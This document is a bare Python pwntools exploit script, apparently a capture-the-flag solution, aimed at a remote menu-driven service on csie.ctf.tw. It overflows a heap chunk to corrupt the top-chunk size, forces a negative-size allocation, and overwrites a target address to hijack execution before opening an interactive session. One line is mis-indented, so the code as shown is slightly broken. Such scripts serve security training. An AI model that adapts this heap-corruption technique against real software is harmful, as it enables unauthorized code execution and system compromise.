from pwn import *

r = remote('csie.ctf.tw', 10138)
#r = remote('localhost', 10138)

target = 0x400d49
big = 0xffffffffffffffff

def add_item(length, content):
r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(content)

def edit_item(index, length, content):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(index))
    r.recvuntil(":")
    r.sendline(str(length))
    r.recvuntil(":")
    r.sendline(content)

add_item(64, "abc")
edit_item(0, 80, "A"*64 + p64(0) + p64(big))

# item size, box size, sizeof(header)
# -(64 + 16) - (16 + 16) - 16
add_item(-128, "ddaa")
add_item(32, p64(target) * 2)
r.interactive()
